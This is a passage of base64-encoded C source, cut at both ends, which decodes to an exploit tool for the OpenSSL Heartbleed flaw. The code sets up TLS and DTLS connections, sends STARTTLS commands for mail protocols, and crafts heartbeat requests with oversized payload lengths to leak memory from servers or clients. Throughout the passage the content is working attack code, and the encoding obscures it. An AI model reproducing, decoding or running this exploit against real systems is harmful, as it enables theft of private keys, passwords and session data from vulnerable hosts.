GU7DQoJU1NMX0NUWCAqc3NsQ29udGV4dDsNCn0gY29ubmVjdGlvbjsNCg0KdHlwZWRlZiBzdHJ1Y3Qgew0KICB1bnNpZ25lZCBjaGFyIHR5cGU7DQogIHNob3J0IHZlcnNpb247DQogIHVuc2lnbmVkIGludCBsZW5ndGg7DQogIHVuc2lnbmVkIGNoYXIgaGJ0eXBlOw0KICB1bnNpZ25lZCBpbnQgcGF5bG9hZF9sZW5ndGg7DQogIHZvaWQqIHBheWxvYWQ7DQp9IGhlYXJ0YmVhdDsNCg0Kdm9pZCBzc2xfaW5pdCgpOw0Kdm9pZCB1c2FnZSgpOw0KaW50IHRjcF9jb25uZWN0KGNoYXIqLGludCk7DQppbnQgdGNwX2JpbmQoY2hhciosIGludCk7DQpjb25uZWN0aW9uKiB0bHNfY29ubmVjdChpbnQpOw0KY29ubmVjdGlvbiogdGxzX2JpbmQoaW50KTsNCmludCBwcmVfY21kKGludCxpbnQsaW50KTsNCnZvaWQqIGhlYXJ0YmxlZWQoY29ubmVjdGlvbiogLHVuc2lnbmVkIGludCk7DQp2b2lkKiBzbmVha3lsZWFreShjb25uZWN0aW9uKiAsY2hhciosIGludCk7DQoNCnN0YXRpYyBEVExTMV9CSVRNQVAgKmR0bHMxX2dldF9iaXRtYXAoU1NMICpzLCBTU0wzX1JFQ09SRCAqcnIsIHVuc2lnbmVkIGludCAqaXNfbmV4dF9lcG9jaCk7DQpzdGF0aWMgaW50IGR0bHMxX3JlY29yZF9yZXBsYXlfY2hlY2soU1NMICpzLCBEVExTMV9CSVRNQVAgKmJpdG1hcCk7DQpzdGF0aWMgaW50IGR0bHMxX2J1ZmZlcl9yZWNvcmQoU1NMICpzLCByZWNvcmRfcHF1ZXVlICpxLCB1bnNpZ25lZCBjaGFyICpwcmlvcml0eSk7DQpzdGF0aWMgdm9pZCBkdGxzMV9yZWNvcmRfYml0bWFwX3VwZGF0ZShTU0wgKnMsIERUTFMxX0JJVE1BUCAqYml0bWFwKTsNCg0KaW50IHRjcF9jb25uZWN0KGNoYXIqIHNlcnZlcixpbnQgcG9ydCl7DQoJaW50IHNkLHJldDsNCglzdHJ1Y3QgaG9zdGVudCAqaG9zdDsNCiAgICAgICAgc3RydWN0IHNvY2thZGRyX2luIHNhOw0KICAgICAgICBob3N0ID0gZ2V0aG9zdGJ5bmFtZShzZXJ2ZXIpOw0KICAgICAgICBzZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgMCk7DQogICAgICAgIGlmKHNkPT0tMSl7DQoJCXByaW50ZigiWyFdIGNhbm5vdCBjcmVhdGUgc29ja2V0XG4iKTsNCgkJZXhpdCgwKTsNCgl9DQoJc2Euc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgICAgIHNhLnNpbl9wb3J0ID0gaHRvbnMocG9ydCk7DQogICAgICAgIHNhLnNpbl9hZGRyID0gKigoc3RydWN0IGluX2FkZHIgKikgaG9zdC0+aF9hZGRyKTsNCiAgICAgICAgYnplcm8oJihzYS5zaW5femVybyksOCk7DQoJcHJpbnRmKCJbIGNvbm5lY3RpbmcgdG8gJXMgJWQvdGNwXG4iLHNlcnZlcixwb3J0KTsNCiAgICAgICAgcmV0ID0gY29ubmVjdChzZCwoc3RydWN0IHNvY2thZGRyICopJnNhLCBzaXplb2Yoc3RydWN0IHNvY2thZGRyKSk7DQoJaWYocmV0PT0wKXsNCgkJcHJpbnRmKCJbIGNvbm5lY3RlZCB0byAlcyAlZC90Y3BcbiIsc2VydmVyLHBvcnQpOw0KCX0NCgllbHNlew0KCQlwcmludGYoIlshXSBGQVRBTDogY291bGQgbm90IGNvbm5lY3QgdG8gJXMgJWQvdGNwXG4iLHNlcnZlcixwb3J0KTsNCgkJZXhpdCgwKTsNCgl9DQoJcmV0dXJuIHNkOw0KfQ0KDQppbnQgdGNwX2JpbmQoY2hhciogc2VydmVyLCBpbnQgcG9ydCl7DQoJaW50IHNkLCByZXQsIHZhbD0xOw0KCXN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQoJc3RydWN0IGhvc3RlbnQgKmhvc3Q7DQoJaG9zdCA9IGdldGhvc3RieW5hbWUoc2VydmVyKTsNCglzZD1zb2NrZXQoQUZfSU5FVCxTT0NLX1NUUkVBTSwwKTsNCglpZihzZD09LTEpew0KICAgIAkJcHJpbnRmKCJbIV0gY2Fubm90IGNyZWF0ZSBzb2NrZXRcbiIpOw0KCQlleGl0KDApOw0KCX0NCgltZW1zZXQoJnNpbiwwLHNpemVvZihzaW4pKTsNCglzaW4uc2luX2FkZHI9Kigoc3RydWN0IGluX2FkZHIgKikgaG9zdC0+aF9hZGRyKTsNCglzaW4uc2luX2ZhbWlseT1BRl9JTkVUOw0KCXNpbi5zaW5fcG9ydD1odG9ucyhwb3J0KTsNCiAgICAJc2V0c29ja29wdChzZCxTT0xfU09DS0VULFNPX1JFVVNFQUREUiwmdmFsLHNpemVvZih2YWwpKTsNCglyZXQgPSBiaW5kKHNkLChzdHJ1Y3Qgc29ja2FkZHIgKikmc2luLHNpemVvZihzaW4pKTsNCglpZihyZXQ9PS0xKXsNCgkJcHJpbnRmKCJbIV0gY2Fubm90IGJpbmQgc29ja2V0XG4iKTsNCgkJZXhpdCgwKTsNCgl9DQoJbGlzdGVuKHNkLDUpOw0KCXJldHVybihzZCk7DQp9DQoNCmNvbm5lY3Rpb24qIGR0bHNfc2VydmVyKGludCBzZCwgY2hhciogc2VydmVyLGludCBwb3J0KXsNCglpbnQgYnl0ZXM7DQogICAgICAgIGNvbm5lY3Rpb24gKmM7DQogICAgICAgIGNoYXIqIGJ1ZjsNCglidWYgPSBtYWxsb2MoNDA5Nik7DQoJaW50IHJldDsNCglzdHJ1Y3QgaG9zdGVudCAqaG9zdDsNCiAgICAgICAgc3RydWN0IHNvY2thZGRyX2luIHNhOw0KCXVuc2lnbmVkIGxvbmcgYWRkcjsNCiAgICAgICAgaWYgKChob3N0ID0gZ2V0aG9zdGJ5bmFtZShzZXJ2ZXIpKSA9PSBOVUxMKSB7DQoJCXBlcnJvcigiZ2V0aG9zdGJ5bmFtZSIpOw0KCQlleGl0KDEpOw0KCX0NCiAgICAgICAgc2QgPSBzb2NrZXQoQUZfSU5FVCwgU09DS19ER1JBTSwgSVBQUk9UT19VRFApOw0KICAgICAgICBpZihzZD09LTEpew0KCQlwcmludGYoIlshXSBjYW5ub3QgY3JlYXRlIHNvY2tldFxuIik7DQoJCWV4aXQoMCk7DQoJfQ0KCXNhLnNpbl9mYW1pbHkgPSBBRl9JTkVUOw0KICAgICAgICBzYS5zaW5fcG9ydCA9IGh0b25zKHBvcnQpOw0KICAgICAgICBzYS5zaW5fYWRkciA9ICooKHN0cnVjdCBpbl9hZGRyICopIGhvc3QtPmhfYWRkcik7DQoJaWYgKGJpbmQoc2QsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNhICxzaXplb2Yoc3RydWN0IHNvY2thZGRyX2luKSkgPCAwKSB7DQoJCXBlcnJvcigiYmluZCgpIik7DQoJCWV4aXQoMSk7DQoJfQ0KDQoJQklPICpiaW87DQogICAgICAgIGlmKGM9PU5VTEwpew0KCQlwcmludGYoIlsgZXJyb3IgaW4gbWFsbG9jKClcbiIpOw0KCQlleGl0KDApOw0KCX0NCiAgICAgICAgaWYoYnVmPT1OVUxMKXsNCiAgICAgICAgICAgICAgICBwcmludGYoIlsgZXJyb3IgaW4gbWFsbG9jKClcbiIpOw0KICAgICAgICAgICAgICAgIGV4aXQoMCk7DQogICAgICAgIH0NCgltZW1zZXQoYnVmLDAsNDA5Nik7DQoJYyA9IG1hbGxvYyhzaXplb2YoY29ubmVjdGlvbikpOw0KCWlmKGM9PU5VTEwpew0KICAgICAgICAgICAgICAgIHByaW50ZigiWyBlcnJvciBpbiBtYWxsb2MoKVxuIik7DQogICAgICAgICAgICAgICAgZXhpdCgwKTsNCiAgICAgICAgfQ0KCWMtPnNvY2tldCA9IHNkOw0KICAgICAgICBjLT5zc2xIYW5kbGUgPSBOVUxMOw0KICAgICAgICBjLT5zc2xDb250ZXh0ID0gTlVMTDsNCiAgICAgICAgYy0+c3NsQ29udGV4dCA9IFNTTF9DVFhfbmV3KERUTFN2MV9zZXJ2ZXJfbWV0aG9kKCkpOw0KCVNTTF9DVFhfc2V0X3JlYWRfYWhlYWQgKGMtPnNzbENvbnRleHQsIDEpOw0KICAgICAgICBpZihjLT5zc2xDb250ZXh0PT1OVUxMKQ0KICAgICAgICAgICAgICAgIEVSUl9wcmludF9lcnJvcnNfZnAoc3RkZXJyKTsNCglTU0xfQ1RYX1NSUF9DVFhfaW5pdChjLT5zc2xDb250ZXh0KTsNCglTU0xfQ1RYX3VzZV9jZXJ0aWZpY2F0ZV9maWxlKGMtPnNzbENvbnRleHQsICIuL3NlcnZlci5jcnQiLCBTU0xfRklMRVRZUEVfUEVNKTsNCglTU0xfQ1RYX3VzZV9Qcml2YXRlS2V5X2ZpbGUoYy0+c3NsQ29udGV4dCwgIi4vc2VydmVyLmtleSIsIFNTTF9GSUxFVFlQRV9QRU0pOyAgICAgICANCglpZighU1NMX0NUWF9jaGVja19wcml2YXRlX2tleShjLT5zc2xDb250ZXh0KSl7DQoJCXByaW50ZigiWyFdIEZBVEFMOiBwcml2YXRlIGtleSBkb2VzIG5vdCBtYXRjaCB0aGUgY2VydGlmaWNhdGUgcHVibGljIGtleVxuIik7DQoJCWV4aXQoMCk7DQoJfQ0KCWMtPnNzbEhhbmRsZSA9IFNTTF9uZXcoYy0+c3NsQ29udGV4dCk7DQogICAgICAgIGlmKGMtPnNzbEhhbmRsZT09TlVMTCkNCiAgICAgICAgICAgICAgICBFUlJfcHJpbnRfZXJyb3JzX2ZwKHN0ZGVycik7DQogICAgICAgIGlmKCFTU0xfc2V0X2ZkKGMtPnNzbEhhbmRsZSxjLT5zb2NrZXQpKQ0KICAgICAgICAgICAgICAgIEVSUl9wcmludF9lcnJvcnNfZnAoc3RkZXJyKTsNCiAgICAgICAgYmlvID0gQklPX25ld19kZ3JhbShzZCwgQklPX05PQ0xPU0UpOw0KDQogICAgICAgIFNTTF9zZXRfYmlvKGMtPnNzbEhhbmRsZSwgYmlvLCBiaW8pOw0KICAgICAgICBTU0xfc2V0X2FjY2VwdF9zdGF0ZSAoYy0+c3NsSGFuZGxlKTsNCg0KICAgICAgICBpbnQgcmMgPSBTU0xfYWNjZXB0KGMtPnNzbEhhbmRsZSk7DQoJcHJpbnRmICgiWyBTU0wgY29ubmVjdGlvbiB1c2luZyAlc1xuIiwgU1NMX2dldF9jaXBoZXIgKGMtPnNzbEhhbmRsZSkpOw0KLy8JYnl0ZXMgPSBTU0xfcmVhZChjLT5zc2xIYW5kbGUsIGJ1ZiwgNDA5NSk7DQovLwlwcmludGYoIlsgcmVjaWV2ZWQ6ICVkIGJ5dGVzIC0gc2hvd2luZyBvdXRwdXRcbiVzXG5bXG4iLGJ5dGVzLGJ1Zik7DQoJaWYoIWMtPnNzbEhhbmRsZS0+dGxzZXh0X2hlYXJ0YmVhdCAmIFNTTF9UTFNFWFRfSEJfRU5BQkxFRCB8fA0KICAgICAgICAgICAgICAgIGMtPnNzbEhhbmRsZS0+dGxzZXh0X2hlYXJ0YmVhdCAmIFNTTF9UTFNFWFRfSEJfRE9OVF9TRU5EX1JFUVVFU1RTKXsNCiAgICAgICAgICAgICAgICBwcmludGYoIlsgd2FybmluZzogaGVhcnRiZWF0IGV4dGVuc2lvbiBpcyB1bnN1cHBvcnRlZCAodHJ5IGFueXdheSlcbiIpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiBjOw0KfQ0KDQp2b2lkIHNzbF9pbml0KCl7DQogICAgICAgIFNTTF9sb2FkX2Vycm9yX3N0cmluZ3MoKTsNCiAgICAgICAgU1NMX2xpYnJhcnlfaW5pdCgpOw0KICAgICAgICBPcGVuU1NMX2FkZF9hbGxfZGlnZXN0cygpOw0KICAgICAgICBPcGVuU1NMX2FkZF9hbGxfYWxnb3JpdGhtcygpOw0KICAgICAgICBPcGVuU1NMX2FkZF9hbGxfY2lwaGVycygpOw0KfQ0KDQpjb25uZWN0aW9uKiB0bHNfY29ubmVjdChpbnQgc2Qpew0KICAgICAgICBjb25uZWN0aW9uICpjOw0KCWMgPSBtYWxsb2Moc2l6ZW9mKGNvbm5lY3Rpb24pKTsNCiAgICAgICAgaWYoYz09TlVMTCl7DQoJCXByaW50ZigiWyBlcnJvciBpbiBtYWxsb2MoKVxuIik7DQoJCWV4aXQoMCk7DQoJfQ0KCWMtPnNvY2tldCA9IHNkOw0KICAgICAgICBjLT5zc2xIYW5kbGUgPSBOVUxMOw0KICAgICAgICBjLT5zc2xDb250ZXh0ID0gTlVMTDsNCiAgICAgICAgYy0+c3NsQ29udGV4dCA9IFNTTF9DVFhfbmV3KFNTTHYyM19jbGllbnRfbWV0aG9kKCkpOw0KCVNTTF9DVFhfc2V0X29wdGlvbnMoYy0+c3NsQ29udGV4dCwgU1NMX09QX0FMTCB8IFNTTF9PUF9OT19TU0x2MiB8IFNTTF9PUF9OT19TU0x2Myk7DQogICAgICAgIGlmKGMtPnNzbENvbnRleHQ9PU5VTEwpDQogICAgICAgICAgICAgICAgRVJSX3ByaW50X2Vycm9yc19mcChzdGRlcnIpOw0KICAgICAgICBjLT5zc2xIYW5kbGUgPSBTU0xfbmV3KGMtPnNzbENvbnRleHQpOw0KICAgICAgICBpZihjLT5zc2xIYW5kbGU9PU5VTEwpDQogICAgICAgICAgICAgICAgRVJSX3ByaW50X2Vycm9yc19mcChzdGRlcnIpOw0KICAgICAgICBpZighU1NMX3NldF9mZChjLT5zc2xIYW5kbGUsYy0+c29ja2V0KSkNCiAgICAgICAgICAgICAgICBFUlJfcHJpbnRfZXJyb3JzX2ZwKHN0ZGVycik7DQogICAgICAgIGlmKFNTTF9jb25uZWN0KGMtPnNzbEhhbmRsZSkhPTEpDQogICAgICAgICAgICAgICAgRVJSX3ByaW50X2Vycm9yc19mcChzdGRlcnIpOw0KICAgICAgICBpZighYy0+c3NsSGFuZGxlLT50bHNleHRfaGVhcnRiZWF0ICYgU1NMX1RMU0VYVF9IQl9FTkFCTEVEIHx8DQogICAgICAgICAgICAgICAgYy0+c3NsSGFuZGxlLT50bHNleHRfaGVhcnRiZWF0ICYgU1NMX1RMU0VYVF9IQl9ET05UX1NFTkRfUkVRVUVTVFMpew0KICAgICAgICAgICAgICAgIHByaW50ZigiWyB3YXJuaW5nOiBoZWFydGJlYXQgZXh0ZW5zaW9uIGlzIHVuc3VwcG9ydGVkICh0cnkgYW55d2F5KVxuIik7DQogICAgICAgIH0NCglyZXR1cm4gYzsNCn0NCg0KY29ubmVjdGlvbiogZHRsc19jbGllbnQoaW50IHNkLCBjaGFyKiBzZXJ2ZXIsaW50IHBvcnQpew0KCWludCByZXQ7DQoJc3RydWN0IGhvc3RlbnQgKmhvc3Q7DQogICAgICAgIHN0cnVjdCBzb2NrYWRkcl9pbiBzYTsNCiAgICAgICAgY29ubmVjdGlvbiAqYzsNCgltZW1zZXQoKGNoYXIgKikmc2EsMCxzaXplb2Yoc2EpKTsNCgljID0gbWFsbG9jKHNpemVvZihjb25uZWN0aW9uKSk7DQogICAgICAgIGlmICgoaG9zdCA9IGdldGhvc3RieW5hbWUoc2VydmVyKSkgPT0gTlVMTCkgew0KCQlwZXJyb3IoImdldGhvc3RieW5hbWUiKTsNCgkJZXhpdCgxKTsNCgl9DQogICAgICAgIHNkID0gc29ja2V0KEFGX0lORVQsIFNPQ0tfREdSQU0sIElQUFJPVE9fVURQKTsNCiAgICAgICAgaWYoc2Q9PS0xKXsNCgkJcHJpbnRmKCJbIV0gY2Fubm90IGNyZWF0ZSBzb2NrZXRcbiIpOw0KCQlleGl0KDApOw0KCX0NCglzYS5zaW5fZmFtaWx5ID0gQUZfSU5FVDsNCiAgICAgICAgc2Euc2luX3BvcnQgPSBodG9ucyhwb3J0KTsNCiAgICAgICAgc2Euc2luX2FkZHIgPSAqKChzdHJ1Y3QgaW5fYWRkciAqKSBob3N0LT5oX2FkZHIpOw0KCWlmIChjb25uZWN0KHNkLCAoc3RydWN0IHNvY2thZGRyICopICZzYSAsc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcl9pbikpIDwgMCkgew0KCQlwZXJyb3IoImNvbm5lY3QoKSIpOw0KCQlleGl0KDApOw0KCX0NCg0KCUJJTyAqYmlvOw0KICAgICAgICBpZihjPT1OVUxMKXsNCgkJcHJpbnRmKCJbIGVycm9yIGluIG1hbGxvYygpXG4iKTsNCgkJZXhpdCgwKTsNCgl9DQoNCiAgICAgICAgYy0+c3NsQ29udGV4dCA9IE5VTEw7DQogICAgICAgIGMtPnNzbENvbnRleHQgPSBTU0xfQ1RYX25ldyhEVExTdjFfY2xpZW50X21ldGhvZCgpKTsNCglTU0xfQ1RYX3NldF9yZWFkX2FoZWFkIChjLT5zc2xDb250ZXh0LCAxKTsNCiAgICAgICAgaWYoYy0+c3NsQ29udGV4dD09TlVMTCkNCiAgICAgICAgICAgICAgICBFUlJfcHJpbnRfZXJyb3JzX2ZwKHN0ZGVycik7DQogICAgICAgIGlmKGMtPnNzbEhhbmRsZT09TlVMTCkNCiAgICAgICAgICAgICAgICBFUlJfcHJpbnRfZXJyb3JzX2ZwKHN0ZGVycik7DQoNCgljLT5zb2NrZXQgPSBzZDsNCiAgICAgICAgYy0+c3NsSGFuZGxlID0gTlVMTDsNCiAgICAgICAgYy0+c3NsSGFuZGxlID0gU1NMX25ldyhjLT5zc2xDb250ZXh0KTsNCglTU0xfc2V0X3Rsc2V4dF9ob3N0X25hbWUoYy0+c3NsSGFuZGxlLHNlcnZlcik7DQoJYmlvID0gQklPX25ld19kZ3JhbShzZCwgQklPX05PQ0xPU0UpOw0KDQoJQklPX2N0cmxfc2V0X2Nvbm5lY3RlZChiaW8sIDEsICZzYSk7DQoJU1NMX3NldF9iaW8oYy0+c3NsSGFuZGxlLCBiaW8sIGJpbyk7DQoJU1NMX3NldF9jb25uZWN0X3N0YXRlIChjLT5zc2xIYW5kbGUpOw0KLy9wcmludGYoImVzaHRhXG4iKTsNCiAgICAgICAgaWYoU1NMX2Nvbm5lY3QoYy0+c3NsSGFuZGxlKSE9MSkgDQogICAgICAgICAgICAgICAgRVJSX3ByaW50X2Vycm9yc19mcChzdGRlcnIpOw0KDQogICAgICAgIGlmKCFjLT5zc2xIYW5kbGUtPnRsc2V4dF9oZWFydGJlYXQgJiBTU0xfVExTRVhUX0hCX0VOQUJMRUQgfHwNCiAgICAgICAgICAgICAgICBjLT5zc2xIYW5kbGUtPnRsc2V4dF9oZWFydGJlYXQgJiBTU0xfVExTRVhUX0hCX0RPTlRfU0VORF9SRVFVRVNUUyl7DQogICAgICAgICAgICAgICAgcHJpbnRmKCJbIHdhcm5pbmc6IGhlYXJ0YmVhdCBleHRlbnNpb24gaXMgdW5zdXBwb3J0ZWQgKHRyeSBhbnl3YXkpLCAlZCBcbiIsYy0+c3NsSGFuZGxlLT50bHNleHRfaGVhcnRiZWF0KTsNCiAgICAgICAgfQ0KCXJldHVybiBjOw0KfQ0KDQpjb25uZWN0aW9uKiB0bHNfYmluZChpbnQgc2Qpew0KCWludCBieXRlczsNCiAgICAgICAgY29ubmVjdGlvbiAqYzsNCiAgICAgICAgY2hhciogYnVmOw0KCWJ1ZiA9IG1hbGxvYyg0MDk2KTsNCiAgICAgICAgaWYoYnVmPT1OVUxMKXsNCiAgICAgICAgICAgICAgICBwcmludGYoIlsgZXJyb3IgaW4gbWFsbG9jKClcbiIpOw0KICAgICAgICAgICAgICAgIGV4aXQoMCk7DQogICAgICAgIH0NCgltZW1zZXQoYnVmLDAsNDA5Nik7DQoJYyA9IG1hbGxvYyhzaXplb2YoY29ubmVjdGlvbikpOw0KCWlmKGM9PU5VTEwpew0KICAgICAgICAgICAgICAgIHByaW50ZigiWyBlcnJvciBpbiBtYWxsb2MoKVxuIik7DQogICAgICAgICAgICAgICAgZXhpdCgwKTsNCiAgICAgICAgfQ0KCWMtPnNvY2tldCA9IHNkOw0KICAgICAgICBjLT5zc2xIYW5kbGUgPSBOVUxMOw0KICAgICAgICBjLT5zc2xDb250ZXh0ID0gTlVMTDsNCiAgICAgICAgYy0+c3NsQ29udGV4dCA9IFNTTF9DVFhfbmV3KFNTTHYyM19zZXJ2ZXJfbWV0aG9kKCkpOw0KICAgICAgICBpZihjLT5zc2xDb250ZXh0PT1OVUxMKQ0KICAgICAgICAgICAgICAgIEVSUl9wcmludF9lcnJvcnNfZnAoc3RkZXJyKTsNCglTU0xfQ1RYX3NldF9vcHRpb25zKGMtPnNzbENvbnRleHQsIFNTTF9PUF9BTEwgfCBTU0xfT1BfTk9fU1NMdjIgfCBTU0xfT1BfTk9fU1NMdjMpOw0KCVNTTF9DVFhfU1JQX0NUWF9pbml0KGMtPnNzbENvbnRleHQpOw0KCVNTTF9DVFhfdXNlX2NlcnRpZmljYXRlX2ZpbGUoYy0+c3NsQ29udGV4dCwgIi4vc2VydmVyLmNydCIsIFNTTF9GSUxFVFlQRV9QRU0pOw0KCVNTTF9DVFhfdXNlX1ByaXZhdGVLZXlfZmlsZShjLT5zc2xDb250ZXh0LCAiLi9zZXJ2ZXIua2V5IiwgU1NMX0ZJTEVUWVBFX1BFTSk7ICAgICAgIA0KCWlmKCFTU0xfQ1RYX2NoZWNrX3ByaXZhdGVfa2V5KGMtPnNzbENvbnRleHQpKXsNCgkJcHJpbnRmKCJbIV0gRkFUQUw6IHByaXZhdGUga2V5IGRvZXMgbm90IG1hdGNoIHRoZSBjZXJ0aWZpY2F0ZSBwdWJsaWMga2V5XG4iKTsNCgkJZXhpdCgwKTsNCgl9DQoJYy0+c3NsSGFuZGxlID0gU1NMX25ldyhjLT5zc2xDb250ZXh0KTsNCiAgICAgICAgaWYoYy0+c3NsSGFuZGxlPT1OVUxMKQ0KICAgICAgICAgICAgICAgIEVSUl9wcmludF9lcnJvcnNfZnAoc3RkZXJyKTsNCiAgICAgICAgaWYoIVNTTF9zZXRfZmQoYy0+c3NsSGFuZGxlLGMtPnNvY2tldCkpDQogICAgICAgICAgICAgICAgRVJSX3ByaW50X2Vycm9yc19mcChzdGRlcnIpOw0KICAgICAgICBpbnQgcmMgPSBTU0xfYWNjZXB0KGMtPnNzbEhhbmRsZSk7DQoJcHJpbnRmICgiWyBTU0wgY29ubmVjdGlvbiB1c2luZyAlc1xuIiwgU1NMX2dldF9jaXBoZXIgKGMtPnNzbEhhbmRsZSkpOw0KCWJ5dGVzID0gU1NMX3JlYWQoYy0+c3NsSGFuZGxlLCBidWYsIDQwOTUpOw0KCXByaW50ZigiWyByZWNpZXZlZDogJWQgYnl0ZXMgLSBzaG93aW5nIG91dHB1dFxuJXNcbltcbiIsYnl0ZXMsYnVmKTsNCglpZighYy0+c3NsSGFuZGxlLT50bHNleHRfaGVhcnRiZWF0ICYgU1NMX1RMU0VYVF9IQl9FTkFCTEVEIHx8DQogICAgICAgICAgICAgICAgYy0+c3NsSGFuZGxlLT50bHNleHRfaGVhcnRiZWF0ICYgU1NMX1RMU0VYVF9IQl9ET05UX1NFTkRfUkVRVUVTVFMpew0KICAgICAgICAgICAgICAgIHByaW50ZigiWyB3YXJuaW5nOiBoZWFydGJlYXQgZXh0ZW5zaW9uIGlzIHVuc3VwcG9ydGVkICh0cnkgYW55d2F5KVxuIik7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGM7DQp9DQoNCmludCBwcmVfY21kKGludCBzZCxpbnQgcHJlY21kLGludCB2ZXJib3NlKXsNCgkvKiB0aGlzIGZ1bmN0aW9uIGNhbiBiZSB1c2VkIHRvIHNlbmQgY29tbWFuZHMgdG8gYSBwbGFpbi10ZXh0DQoJc2VydmljZSBvciBjbGllbnQgYmVmb3JlIGhlYXJ0YmxlZWQgZXhwbG9pdCBhdHRlbXB0LiBlLmcuIFNUQVJUVExTICovDQoJaW50IHJjLCBnbyA9IDA7DQoJY2hhciogYnVmZmVyOw0KCWNoYXIqIGxpbmUxOw0KCWNoYXIqIGxpbmUyOyAgDQoJc3dpdGNoKHByZWNtZCl7DQoJCWNhc2UgMDoNCgkJCWxpbmUxID0gIkVITE8gdGVzdFxuIjsNCgkJCWxpbmUyID0gIlNUQVJUVExTXG4iOw0KCQkJYnJlYWs7DQoJCWNhc2UgMToNCgkJCWxpbmUxID0gIkNBUEFcbiI7DQoJCQlsaW5lMiA9ICJTVExTXG4iOw0KCQkJYnJlYWs7DQoJCWNhc2UgMjoNCgkJCWxpbmUxID0gImEwMDEgQ0FQQlxuIjsNCgkJCWxpbmUyID0gImEwMDIgU1RBUlRUTFNcbiI7DQoJCQlicmVhazsNCgkJZGVmYXVsdDoNCgkJCWdvID0gMTsNCgkJCWJyZWFrOw0KCX0NCglpZihnbz09MCl7DQoJCWJ1ZmZlciA9IG1hbGxvYygyMDQ5KTsNCgkgICAgICAgIGlmKGJ1ZmZlcj09TlVMTCl7DQogICAgICAgICAgICAgICAgCXByaW50ZigiWyBlcnJvciBpbiBtYWxsb2MoKVxuIik7DQogICAgICAgICAgICAgICAgCWV4aXQoMCk7DQoJICAgICAgICB9DQoJCW1lbXNldChidWZmZXIsMCwyMDQ5KTsNCgkJcmMgPSByZWFkKHNkLGJ1ZmZlciwyMDQ4KTsNCgkJcHJpbnRmKCJbIGJhbm5lcjogJXMiLGJ1ZmZlcik7DQoJCXNlbmQoc2QsbGluZTEsc3RybGVuKGxpbmUxKSwwKTsNCgkJbWVtc2V0KGJ1ZmZlciwwLDIwNDkpOw0KCQlyYyA9IHJlYWQoc2QsYnVmZmVyLDIwNDgpOw0KCQlpZih2ZXJib3NlPT0xKXsNCgkJCXByaW50ZigiJXNcbiIsYnVmZmVyKTsNCgkJfQ0KCQlzZW5kKHNkLGxpbmUyLHN0cmxlbihsaW5lMiksMCk7DQoJCW1lbXNldChidWZmZXIsMCwyMDQ5KTsNCgkJcmMgPSByZWFkKHNkLGJ1ZmZlciwyMDQ4KTsNCgkJaWYodmVyYm9zZT09MSl7DQoJCQlwcmludGYoIiVzXG4iLGJ1ZmZlcik7DQoJCX0NCgl9DQoJcmV0dXJuIHNkOw0KfQ0KDQp2b2lkKiBoZWFydGJsZWVkKGNvbm5lY3Rpb24gKmMsdW5zaWduZWQgaW50IHR5cGUpew0KCXVuc2lnbmVkIGNoYXIgKmJ1ZiwgKnA7DQogICAgICAgIGludCByZXQ7DQoJYnVmID0gT1BFTlNTTF9tYWxsb2MoMSArIDIpOw0KCWlmKGJ1Zj09TlVMTCl7DQogICAgICAgICAgICAgICAgcHJpbnRmKCJbIGVycm9yIGluIG1hbGxvYygpXG4iKTsNCiAgICAgICAgICAgICAgICBleGl0KDApOw0KICAgICAgICB9DQoJcCA9IGJ1ZjsNCiAgICAgICAgKnArKyA9IFRMUzFfSEJfUkVRVUVTVDsNCglzd2l0Y2godHlwZSl7DQoJCWNhc2UgMDoNCgkJCXMybigweDAscCk7DQoJCQlicmVhazsNCgkJY2FzZSAxOg0KCQkJczJuKDB4ZmZmZixwKTsNCgkJCWJyZWFrOw0KCQlkZWZhdWx0Og0KCQkJcHJpbnRmKCJbIHNldHRpbmcgaGVhcnRiZWF0IHBheWxvYWRfbGVuZ3RoIHRvICV1XG4iLHR5cGUpOw0KCQkJczJuKHR5cGUscCk7DQoJCQlicmVhazsNCgl9DQoJcHJpbnRmKCJbIDwzIDwzIDwzIGhlYXJ0IGJsZWVkIDwzIDwzIDwzXG4iKTsNCiAgICAgICAgcmV0ID0gc3NsM193cml0ZV9ieXRlcyhjLT5zc2xIYW5kbGUsIFRMUzFfUlRfSEVBUlRCRUFULCBidWYsIDMpOw0KICAgICAgICBPUEVOU1NMX2ZyZWUoYnVmKTsNCglyZXR1cm4gYzsNCn0NCg0Kdm9pZCogZHRsc2hlYXJ0YmxlZWQoY29ubmVjdGlvbiAqYyx1bnNpZ25lZCBpbnQgdHlwZSl7DQoNCgl1bnNpZ25lZCBjaGFyICpidWYsICpwOw0KICAgICAgICBpbnQgcmV0Ow0KCWJ1ZiA9IE9QRU5TU0xfbWFsbG9jKDEgKyAyICsgMTYpOw0KCW1lbXNldChidWYsICdcMCcsIHNpemVvZiBidWYpOw0KCWlmKGJ1Zj09TlVMTCl7DQogICAgICAgICAgICAgICAgcHJpbnRmKCJbIGVycm9yIGluIG1hbGxvYygpXG4iKTsNCiAgICAgICAgICAgICAgICBleGl0KDApOw0KICAgICAgICB9DQoJcCA9IGJ1ZjsNCiAgICAgICAgKnArKyA9IFRMUzFfSEJfUkVRVUVTVDsNCglzd2l0Y2godHlwZSl7DQoJCWNhc2UgMDoNCgkJCXMybigweDAscCk7DQoJCQlicmVhazsNCgkJY2FzZSAxOg0KLy8JCQlzMm4oMHhmZmZmLHApOw0KLy8JCQlzMm4oMHgzZmViLHApOw0KCQkJczJuKDB4MDUzOCxwKTsNCgkJCWJyZWFrOw0KCQlkZWZhdWx0Og0KCQkJcHJpbnRmKCJbIHNldHRpbmcgaGVhcnRiZWF0IHBheWxvYWRfbGVuZ3RoIHRvICV1XG4iLHR5cGUpOw0KCQkJczJuKHR5cGUscCk7DQoJCQlicmVhazsNCgl9DQoJczJuKGMtPnNzbEhhbmRsZS0+dGxzZXh0X2hiX3NlcSwgcCk7DQoJcHJpbnRmKCJbIDwzIDwzIDwzIGhlYXJ0IGJsZWVkIDwzIDwzIDwzXG4iKTsNCg0KICAgICAgICAgIHJldCA9IGR0bHMxX3dyaXRlX2J5dGVzKGMtPnNzbEhhbmRsZSwgVExTMV9SVF9IRUFSVEJFQVQsIGJ1ZiwgMyArIDE2KTsNCg0KCWlmIChyZXQgPj0gMCkNCgkJew0KCQlpZiAoYy0+c3NsSGFu